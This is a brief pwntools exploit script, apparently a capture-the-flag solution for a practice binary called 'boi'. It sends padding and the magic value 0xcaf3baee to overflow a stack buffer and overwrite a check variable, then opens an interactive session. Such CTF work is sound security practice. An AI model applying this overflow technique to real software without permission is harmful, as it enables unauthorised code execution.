from pwn import *

io = process('./boi')

def debug(argv=''):
    gdb.attach(io, argv)
    pause()

context.arch = 'amd64'
context.log_level = 'debug'

io.recvuntil('Are you a big boiiiii??\n')
#  debug('b * main')
payload = flat(['@'*0x14, 0xcaf3baee])
io.send(payload)
io.interactive()
